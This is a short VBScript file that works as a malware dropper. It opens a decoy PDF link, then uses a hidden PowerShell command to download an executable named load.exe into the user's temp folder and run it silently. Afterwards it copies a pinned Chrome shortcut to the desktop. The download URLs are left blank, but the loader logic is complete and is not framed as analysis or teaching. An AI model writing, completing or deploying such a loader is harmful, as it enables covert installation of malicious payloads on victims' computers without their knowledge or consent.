Set objShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

pdfUrl = ""
browserCommand = "cmd /c start " & pdfUrl
objShell.Run browserCommand, 0, False

url = ""
tempFolder = objShell.ExpandEnvironmentStrings("%TEMP%")
savePath = tempFolder & "\load.exe"
downloadCommand = "powershell -Command ""Invoke-WebRequest -Uri '" & url & "' -OutFile '" & savePath & "'"""
objShell.Run downloadCommand, 0, True

If fso.FileExists(savePath) Then
    objShell.Run """" & savePath & """", 0, False
    WScript.Sleep 30000
End If

taskbarPath = objShell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\"
desktopPath = objShell.SpecialFolders("Desktop")
shortcutName = "Google Chrome.lnk"
taskbarShortcut = taskbarPath & shortcutName
desktopShortcut = desktopPath & "\" & shortcutName

If fso.FileExists(taskbarShortcut) Then
    fso.CopyFile taskbarShortcut, desktopShortcut
End If
